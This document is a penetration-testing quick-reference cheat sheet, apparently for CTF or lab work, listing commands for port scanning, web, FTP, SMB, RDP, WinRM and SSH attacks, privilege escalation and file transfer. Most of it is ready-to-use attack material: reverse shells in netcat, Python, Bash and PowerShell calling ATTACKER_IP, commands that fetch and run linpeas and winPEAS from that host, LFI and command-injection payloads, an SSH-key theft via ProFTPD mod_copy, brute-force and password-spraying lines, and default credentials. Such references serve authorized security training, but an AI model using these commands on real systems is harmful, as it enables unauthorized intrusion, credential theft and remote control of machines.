# Quick Reference Commands - Penetration Testing

## Web Server Enumeration

### Directory Bruteforcing
```bash
# gobuster (fast, modern)
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# dirb (classic)
dirb http://TARGET /usr/share/wordlists/dirb/common.txt

# With authentication
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -U username -P password
```

### Web Vulnerability Scanning
```bash
# nikto
nikto -h http://TARGET

# WPScan (WordPress)
wpscan --url http://TARGET --enumerate u,vp

# SQLmap (SQL injection)
sqlmap -u "http://TARGET/page.php?id=1" --batch --dbs
```

### Manual Web Testing
```bash
# Grab banner
curl -I http://TARGET

# View page source
curl http://TARGET

# Common files to check
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml
curl http://TARGET/flag.txt
curl http://TARGET/.git/config
curl http://TARGET/.env
curl http://TARGET/config.php.bak

# Test for LFI
curl http://TARGET/page.php?file=../../../../etc/passwd
curl http://TARGET/?page=../../../../../../etc/passwd

# Test for RCE
curl http://TARGET/ping.php?ip=127.0.0.1;whoami
```

---

## FTP Enumeration

```bash
# Anonymous login
ftp TARGET
# Username: anonymous
# Password: anonymous or your@email.com

# Commands once connected
ls -la
pwd
get flag.txt
mget *.txt
binary  # For binary files
ascii   # For text files

# Non-interactive
ftp -n TARGET << EOF
user anonymous anonymous
ls
bye
EOF
```

### ProFTPD Exploitation (mod_copy)
```bash
# Manual exploitation
ftp TARGET
SITE CPFR /home/user/.ssh/id_rsa
SITE CPTO /var/www/html/key.txt

# Metasploit
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS TARGET
set SITEPATH /var/www/html
exploit
```

---

## SMB/CIFS Enumeration

```bash
# List shares
smbclient -L //TARGET -N

# Connect to a share
smbclient //TARGET/sharename -N
smbclient //TARGET/sharename -U username

# Enumerate everything
enum4linux -a TARGET

# CrackMapExec
crackmapexec smb TARGET
crackmapexec smb TARGET -u '' -p ''  # Null session
crackmapexec smb TARGET -u username -p password

# Download all files from share
smbget -R smb://TARGET/sharename
```

---

## RDP Enumeration & Attacks

```bash
# Check for vulnerabilities
nmap -p 3389 --script rdp-vuln-ms12-020 TARGET
nmap -p 3389 --script rdp-enum-encryption TARGET

# Password attacks
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET
crowbar -b rdp -s TARGET -u administrator -C passwords.txt

# Connect with credentials
rdesktop TARGET
xfreerdp /u:username /p:password /v:TARGET
```

---

## WinRM Enumeration & Attacks

```bash
# Check if WinRM is accessible
crackmapexec winrm TARGET
crackmapexec winrm TARGET -u username -p password

# Connect with Evil-WinRM
evil-winrm -i TARGET -u username -p password

# Password spraying
crackmapexec winrm TARGET -u users.txt -p Password123
```

---

## SSH Enumeration

```bash
# Banner grab
nc TARGET 22

# User enumeration (timing attack - OpenSSH < 7.7)
python ssh_enum.py --userList users.txt TARGET

# Brute force (not recommended, noisy)
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# Connect with credentials
ssh username@TARGET

# Connect with key
ssh -i id_rsa username@TARGET
```

---

## Port Scanning

```bash
# Quick scan (top 1000 ports)
nmap TARGET

# All ports
nmap -p- TARGET

# Service version detection
nmap -sV TARGET

# OS detection
nmap -O TARGET

# Aggressive scan
nmap -A TARGET

# All TCP ports with service detection
nmap -p- -sV TARGET -oN fullscan.txt

# UDP scan (slow)
nmap -sU -F TARGET

# Scan specific ports
nmap -p 21,22,80,443 TARGET

# Script scanning
nmap --script vuln TARGET
nmap --script=smb-vuln* TARGET
```

---

## Netcat Usage

```bash
# Connect to a port
nc TARGET PORT

# Listen on a port (reverse shell)
nc -lvnp 4444

# Send data
echo "GET / HTTP/1.0" | nc TARGET 80

# Transfer file
# On receiver: nc -lvnp 4444 > file.txt
# On sender: nc TARGET 4444 < file.txt

# Banner grabbing
nc -v TARGET PORT
```

---

## Reverse Shells

### Netcat Reverse Shell (Linux)
```bash
# On attacker
nc -lvnp 4444

# On target
nc ATTACKER_IP 4444 -e /bin/bash
# Or if -e not available:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Python Reverse Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### PowerShell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## Privilege Escalation

### Linux Enumeration
```bash
# Check sudo privileges
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable files in /etc
find /etc -writable 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Kernel version (for kernel exploits)
uname -a
cat /etc/issue

# Running processes
ps aux | grep root

# Network connections
netstat -antup

# Automated tools
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Windows Enumeration
```powershell
# User info
whoami /all
whoami /priv

# System info
systeminfo
hostname

# Network info
ipconfig /all
netstat -ano

# Installed programs
wmic product get name,version

# Running services
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Automated tools
certutil -urlcache -f http://ATTACKER_IP/winPEAS.exe winPEAS.exe
winPEAS.exe
```

---

## File Transfer Methods

### Linux

#### Using wget
```bash
wget http://ATTACKER_IP/file
```

#### Using curl
```bash
curl http://ATTACKER_IP/file -o file
```

#### Using netcat
```bash
# On attacker
nc -lvnp 4444 < file

# On target
nc ATTACKER_IP 4444 > file
```

### Windows

#### Using certutil
```powershell
certutil -urlcache -f http://ATTACKER_IP/file file
```

#### Using PowerShell
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP/file','file')"
```

#### Using bitsadmin
```powershell
bitsadmin /transfer mydownload http://ATTACKER_IP/file C:\temp\file
```

---

## Exploit Search

```bash
# SearchSploit
searchsploit apache
searchsploit -m exploits/linux/remote/12345.py  # Copy exploit

# Metasploit
msfconsole
search proftpd
use exploit/unix/ftp/proftpd_modcopy_exec
show options
set RHOSTS TARGET
exploit

# Online resources
# - exploit-db.com
# - cve.mitre.org
# - nvd.nist.gov
```

---

## Setting Up HTTP Server (for file transfers)

```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# PHP
php -S 0.0.0.0:80

# Ruby
ruby -run -e httpd . -p 80
```

---

## Useful One-Liners

### Linux
```bash
# Find files containing "flag"
find / -name "*flag*" 2>/dev/null

# Find files owned by user
find / -user username 2>/dev/null

# Find world-writable files
find / -perm -002 -type f 2>/dev/null

# Search file contents for "password"
grep -ri "password" / 2>/dev/null

# Check history
cat ~/.bash_history
cat ~/.mysql_history
```

### Windows
```powershell
# Find files containing "flag"
Get-ChildItem -Path C:\ -Include *flag* -Recurse -ErrorAction SilentlyContinue

# Search file contents
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String "password"

# Check PowerShell history
Get-Content (Get-PSReadLineOption).HistorySavePath
```

---

## Password Lists Location (Kali Linux)

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## Common Service Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| FTP | anonymous | anonymous |
| MySQL | root | root / blank |
| PostgreSQL | postgres | postgres |
| MongoDB | blank | blank |
| Tomcat | admin | admin / tomcat |
| WordPress | admin | admin / password |

---

## Port Numbers Quick Reference

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 139 | NetBIOS |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 1433 | MS SQL |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 5985 | WinRM HTTP |
| 5986 | WinRM HTTPS |
| 8080 | HTTP Alt |
